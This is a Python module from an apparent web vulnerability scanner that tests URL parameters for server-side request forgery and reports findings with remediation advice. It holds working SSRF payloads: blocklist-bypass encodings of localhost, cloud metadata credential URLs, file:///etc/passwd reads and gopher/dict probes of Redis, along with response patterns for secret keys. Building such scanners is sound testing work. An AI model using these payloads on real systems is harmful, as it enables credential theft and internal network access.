"""SentinelX module [10]: Server-Side Request Forgery.

Real implementation with multi-signal detection:
  Phase 0 — baseline capture (original param value)
  Phase 1 — error oracle: closed-port probe; fetch-attempt error messages
            ("connection refused", "getaddrinfo", ...) PROVE the server fetched
  Phase 2 — differential: closed-port vs open-port response comparison.
            If the server behaves differently, it IS fetching our URLs.
  Phase 3 — internal content: bypass payloads (127.1, decimal/hex/octal IP)
            to defeat naive blocklists; differential vs external URL
  Phase 4 — marker scan: cloud metadata / service banners in responses
  Phase 5 — OOB: --oob-domain DNS exfiltration when provided

2-signal confirmation required: no finding on a single weak signal.
"""

from __future__ import annotations

import asyncio
import re
import time
from urllib.parse import urlencode as _urlencode, urlsplit

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
from sentinelx.discovery.paramtypes import url_params

# ---------------------------------------------------------------------------
# Payload groups (labeled by technique — see Phase 2 payload expansion)
# ---------------------------------------------------------------------------

# Group: direct loopback (highest signal first)
PAYLOADS_DIRECT = [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://localhost:80/",
    "http://[::1]/",
    "http://0.0.0.0/",
]

# Group: blocklist bypasses — alternate 127.0.0.1 representations
PAYLOADS_BYPASS = [
    "http://127.1/",
    "http://127.0.1/",
    "http://2130706433/",          # 127.0.0.1 decimal
    "http://0x7f000001/",          # hex
    "http://0x7f.0.0.1/",          # partial hex
    "http://017700000001/",        # octal
    "http://0177.0.0.1/",          # partial octal
    "http://[::ffff:127.0.0.1]/",  # ipv4-mapped ipv6
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "http://127.0.0.1%09/",        # tab confusion (some parsers strip)
    "http://0.0.0.0/",
]

# Group: private ranges
PAYLOADS_PRIVATE = [
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://192.168.1.1/",
    "http://192.168.0.1/",
]

# Group: cloud metadata
PAYLOADS_METADATA = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/v1.json",
    "http://100.100.100.200/latest/meta-data/",
    "http://169.254.169.254/opc/v1/instance/",
]

# Group: dangerous protocols
PAYLOADS_PROTOCOLS = [
    "file:///etc/passwd",
    "file:///etc/hosts",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    "ftp://127.0.0.1/",
]

# Group: port probes for banner grabbing
PAYLOADS_PORTS = [f"http://127.0.0.1:{p}/" for p in
                  (22, 25, 3306, 6379, 8080, 9200, 27017, 11211)]

# Differential pair: closed port (fast fail) vs likely-open port.
CLOSED_PORT_PROBE = "http://127.0.0.1:9/"
# open-port candidates tried in order; target's own port first
OPEN_PORT_PATHS = ["/", ]


def _open_port_probes(target_url: str) -> list[str]:
    try:
        port = urlsplit(target_url).port or 80
    except Exception:
        port = 80
    probes = [f"http://127.0.0.1:{port}/", "http://127.0.0.1:80/",
              "http://localhost/", "http://127.1/"]
    return list(dict.fromkeys(probes))


# ---------------------------------------------------------------------------
# Detection signals
# ---------------------------------------------------------------------------

# Error messages that PROVE the server attempted an outbound fetch.
FETCH_ERROR_RES = [
    re.compile(r"connection\s+refused", re.I),
    re.compile(r"failed\s+to\s+connect", re.I),
    re.compile(r"could\s+not\s+connect", re.I),
    re.compile(r"getaddrinfo|name\s+or\s+service\s+not\s+known", re.I),
    re.compile(r"ENOTFOUND|EHOSTUNREACH|ENETUNREACH|ETIMEDOUT|ECONNREFUSED", re.I),
    re.compile(r"no\s+route\s+to\s+host", re.I),
    re.compile(r"operation\s+timed\s+out|request\s+timed\s+out", re.I),
    re.compile(r"curl.*error|libcurl", re.I),
    re.compile(r"socket\.gaierror|socket\.timeout|ConnectionError", re.I),
    re.compile(r"urllib.*error|requests\.exceptions", re.I),
    re.compile(r"SSLError|ssl.*certificate", re.I),
    re.compile(r"404.*from\s+(?:upstream|backend)|bad\s+gateway", re.I),
]

# Blocklist / rejection messages — server parsed our URL and refused it.
# Signal: the param IS a fetch sink; switch to bypass payloads.
BLOCKLIST_RES = [
    re.compile(r"(?:url|address|host).{0,30}(?:blocked|not\s+allowed|denied|forbidden|invalid)", re.I),
    re.compile(r"(?:blocked|denied|forbidden).{0,30}(?:url|address|host|ip)", re.I),
    re.compile(r"private|loopback|internal|link-?local|metadata", re.I),
    re.compile(r"invalid\s+(?:url|host|address)", re.I),
]

# Response markers from server-side fetched content (kept from previous impl).
MARKERS = [
    (re.compile(r"ami-id|accountId|accessKeyId|secretAccessKey|instance-id", re.I), "cloud metadata"),
    (re.compile(r"computeMetadata", re.I), "GCP metadata"),
    (re.compile(r"\+PONG|redis_version", re.I), "Redis banner"),
    (re.compile(r"cluster_name|elasticsearch", re.I), "Elasticsearch banner"),
    (re.compile(r"root:x:0:0:"), "file read via SSRF"),
    (re.compile(r"SSH-2\.0"), "SSH banner"),
    (re.compile(r"220.*FTP|ftp", re.I), "FTP banner"),
]

REMEDIATION_SSRF = (
    "Validate and allowlist outbound request targets. Block private/loopback/link-local "
    "ranges (127/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1) at the egress proxy, "
    "resolving DNS first and re-validating after redirects. "
    "Disable unused URL schemes (file, gopher, dict). Require authentication for metadata."
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _is_significant_change(a: str, b: str) -> bool:
    """True if two response bodies differ meaningfully (not just our payload echo)."""
    if a == b:
        return False
    # normalize: strip the injected payloads so reflection alone isn't "change"
    la, lb = len(a), len(b)
    if abs(la - lb) > max(80, int(la * 0.15)):
        return True
    # status-line / first-500-char fingerprint differs
    return a[:500] != b[:500]


def _fetch_error_signals(body: str) -> list[str]:
    return [f"fetch error oracle: {rx.pattern[:40]}" for rx in FETCH_ERROR_RES
            if rx.search(body)]


def _blocklist_signals(body: str) -> list[str]:
    return [f"blocklist hit: {rx.pattern[:40]}" for rx in BLOCKLIST_RES
            if rx.search(body)]


def _marker_signals(body: str, payload: str) -> list[str]:
    # strip the reflected payload before matching: markers must come from
    # server-side fetched content, not from our own reflected input
    clean = body.replace(payload, "")
    return [label for rx, label in MARKERS if rx.search(clean)]


class _Probe:
    __slots__ = ("payload", "full", "body_sent", "status", "body", "elapsed")

    def __init__(self, payload, full, body_sent, status, body, elapsed):
        self.payload = payload
        self.full = full
        self.body_sent = body_sent
        self.status = status
        self.body = body
        self.elapsed = elapsed


async def _send(client: ScanClient, method: str, url: str, params: dict,
                param: str, payload: str, headers: dict) -> _Probe | None:
    p = dict(params)
    p[param] = payload
    t0 = time.monotonic()
    try:
        if method == "GET":
            full = url + ("&" if "?" in url else "?") + _urlencode(p)
            resp = await client.get(full)
            body_sent = None
        else:
            resp = await client.post(url, data=p)
            full, body_sent = url, _urlencode(p).encode()
    except Exception:
        return None
    elapsed = time.monotonic() - t0
    if resp is None:
        return None
    return _Probe(payload, full, body_sent, resp.status_code,
                  resp.text or "", elapsed)


def _mk_finding(method: str, probe: _Probe, param: str, headers: dict,
                signals: list[str], confidence: float,
                level: str, subtype: str = "ssrf") -> Finding:
    ev = Evidence(
        request_raw=raw_request(method, probe.full, headers, probe.body_sent),
        response_raw=raw_response(probe.status, {}, probe.body.encode()),
        proof="SSRF signals: " + "; ".join(signals),
    )
    f = Finding(
        type="Server-Side Request Forgery", subtype=subtype,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
        confidence=confidence, url=probe.full, method=method, param=param,
        payload=probe.payload, evidence=ev, cwe="CWE-918",
        owasp="A10:2021 – SSRF",
        remediation=REMEDIATION_SSRF,
        references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
    )
    f.set_confidence(level)
    return f


# ---------------------------------------------------------------------------
# Main scan
# ---------------------------------------------------------------------------

async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    if not params:
        return findings
    headers = {"User-Agent": config.user_agent}

    # Param prioritization: url-like names/values first (shared classifier),
    # then remaining params (cap to avoid explosion).
    ordered = url_params(params)
    for name in params:
        if name not in ordered:
            ordered.append(name)
    ordered = ordered[:4]

    for param in ordered:
        # ---- Phase 0: baseline (original value) ----
        base_probe = await _send(client, method, url, params, param,
                                 str(params[param]), headers)
        if base_probe is None:
            continue
        base_body, base_status = base_probe.body, base_probe.status

        signals: list[str] = []
        best_probe: _Probe | None = None

        # ---- Phase 1: error oracle (closed port — fast fail) ----
        closed = await _send(client, method, url, params, param,
                             CLOSED_PORT_PROBE, headers)
        if closed is not None:
            err = _fetch_error_signals(closed.body)
            if err:
                signals.append(err[0] +
                               f" (closed-port probe {CLOSED_PORT_PROBE})")
                best_probe = closed
            blk = _blocklist_signals(closed.body)
            if blk and not any("blocklist" in s for s in signals):
                signals.append(blk[0] + " — trying bypass encodings")

        # ---- Phase 2: differential (closed vs open port) ----
        # If the server fetches our URL, a closed port and an open port
        # produce observably different responses.
        open_probes: list[_Probe] = []
        for op in _open_port_probes(url):
            pr = await _send(client, method, url, params, param, op, headers)
            if pr is not None:
                open_probes.append(pr)
                err = _fetch_error_signals(pr.body)
                if err and not any("fetch error oracle" in s for s in signals):
                    signals.append(err[0] + f" (open-port probe {op})")
                    best_probe = best_probe or pr
        if closed is not None and open_probes:
            for opr in open_probes:
                # strip payloads so pure reflection isn't counted as change
                cb = closed.body.replace(CLOSED_PORT_PROBE, "")
                ob = opr.body.replace(opr.payload, "")
                if _is_significant_change(cb, ob):
                    signals.append(
                        f"differential: closed-port ({CLOSED_PORT_PROBE}) vs "
                        f"open-port ({opr.payload}) responses differ "
                        f"(status {closed.status}->{opr.status}, "
                        f"len {len(cb)}->{len(ob)})")
                    best_probe = best_probe or opr
                    break

        # ---- Phase 3: bypass payloads (for naive blocklists) ----
        # Only run if Phase 1/2 suggest a fetch sink (blocklist message or
        # any signal), or if direct loopback was rejected — keeps it fast.
        need_bypass = any("blocklist" in s or "fetch error oracle" in s
                          or "differential" in s for s in signals)
        bypass_probe: _Probe | None = None
        bypass_label = ""
        if need_bypass or True:  # always try a small bypass set; cheap
            for bp in PAYLOADS_BYPASS[:6]:
                pr = await _send(client, method, url, params, param, bp, headers)
                if pr is None:
                    continue
                # differential vs baseline AND vs closed-port
                pb = pr.body.replace(bp, "")
                bb = base_body.replace(str(params[param]), "")
                if _is_significant_change(bb, pb):
                    cb = (closed.body.replace(CLOSED_PORT_PROBE, "")
                          if closed else "")
                    if not closed or _is_significant_change(cb, pb):
                        bypass_probe = pr
                        bypass_label = (
                            f"bypass payload {bp} fetched: response differs "
                            f"from baseline and closed-port "
                            f"(len {len(bb)}->{len(pb)})")
                        break
                mk = _marker_signals(pr.body, bp)
                if mk:
                    bypass_probe = pr
                    bypass_label = f"bypass payload {bp} returned: {mk[0]}"
                    break
        if bypass_probe is not None:
            signals.append(bypass_label)
            best_probe = best_probe or bypass_probe

        # ---- Phase 4: marker scan over high-signal payloads ----
        marker_hit: tuple[_Probe, str] | None = None
        for payload in (PAYLOADS_DIRECT + PAYLOADS_METADATA[:4]
                        + PAYLOADS_PROTOCOLS[:2]):
            pr = await _send(client, method, url, params, param,
                             payload, headers)
            if pr is None:
                continue
            mk = _marker_signals(pr.body, payload)
            if mk:
                marker_hit = (pr, mk[0])
                break
            # error oracle on every payload too (cheap, high value)
            err = _fetch_error_signals(pr.body)
            if err and not any("fetch error oracle" in s for s in signals):
                signals.append(err[0] + f" (payload {payload})")
                best_probe = best_probe or pr
        if marker_hit:
            pr, label = marker_hit
            signals.append(f"content marker: {label} (payload {pr.payload})")
            best_probe = pr

        # ---- Phase 5: OOB (only if user supplied a domain) ----
        if config.oob_domain:
            oob = f"http://ssrf-{param}.{config.oob_domain}/"
            pr = await _send(client, method, url, params, param, oob, headers)
            if pr is not None:
                signals.append(
                    f"OOB probe sent to {oob} — confirm via DNS logs "
                    f"(lead, not confirmation)")
                best_probe = best_probe or pr

        # ---- Verdict: 2-signal rule ----
        # Count independent signal families (error-oracle, differential,
        # bypass, marker, oob-lead). OOB alone never confirms.
        families = set()
        for s in signals:
            if s.startswith("fetch error oracle"):
                families.add("error-oracle")
            elif s.startswith("differential"):
                families.add("differential")
            elif s.startswith("bypass"):
                families.add("bypass")
            elif s.startswith("content marker"):
                families.add("marker")
            elif s.startswith("OOB"):
                families.add("oob")
            elif s.startswith("blocklist"):
                families.add("blocklist")
        real_families = families - {"oob", "blocklist"}

        if len(real_families) >= 2 and best_probe is not None:
            findings.append(_mk_finding(
                method, best_probe, param, headers, signals,
                0.92, "CONFIRMED"))
            continue  # param confirmed — stop (early-stop keeps it fast)
        if len(real_families) == 1 and best_probe is not None:
            # Single strong signal: error-oracle or marker alone is HIGH,
            # differential alone is MEDIUM (needs corroboration).
            if "error-oracle" in families or "marker" in families:
                findings.append(_mk_finding(
                    method, best_probe, param, headers, signals,
                    0.78, "HIGH"))
                continue
            findings.append(_mk_finding(
                method, best_probe, param, headers, signals,
                0.6, "MEDIUM"))

    # --- runtime evidence layer (jsruntime): does page JS fetch internal URLs?
    # Assist-only; never breaks the core detector.
    try:
        from sentinelx.jsruntime import assists as _assists
        _rt = await _assists.analyze_page(client, config, url, timeout=6.0)
        if _rt and _rt.executed:
            _internal = _rt.fetches_url_pattern(
                r"169\.254\.169\.254|metadata\.google|100\.100\.100\.200|"
                r"localhost|127\.0\.0\.1|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.")
            seen_rt: set[str] = set()
            for ep in _internal:
                eu = ep.get("url", "")
                if eu in seen_rt:
                    continue
                seen_rt.add(eu)
                _ev = Evidence(
                    request_raw=raw_request("GET", url, headers, None),
                    response_raw="",
                    proof=(f"Page JavaScript performs {ep.get('method', 'GET')} "
                           f"to internal URL: {eu} (observed via real JS "
                           f"execution). Pages whose JS reaches internal "
                           f"hosts are SSRF-prone surfaces."),
                )
                _f = Finding(
                    type="Server-Side Request Forgery",
                    subtype="ssrf-js-internal-fetch",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                    confidence=0.45, url=url, method="GET", param="",
                    evidence=_ev, cwe="CWE-918",
                    owasp="A10:2021 – SSRF",
                    remediation=REMEDIATION_SSRF,
                    references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                )
                _f.set_confidence("LOW")
                _f.static_only = False
                _f.source = "page-javascript"
                _f.sink = "net:fetch"
                findings.append(_f)
    except Exception:
        pass

    return findings
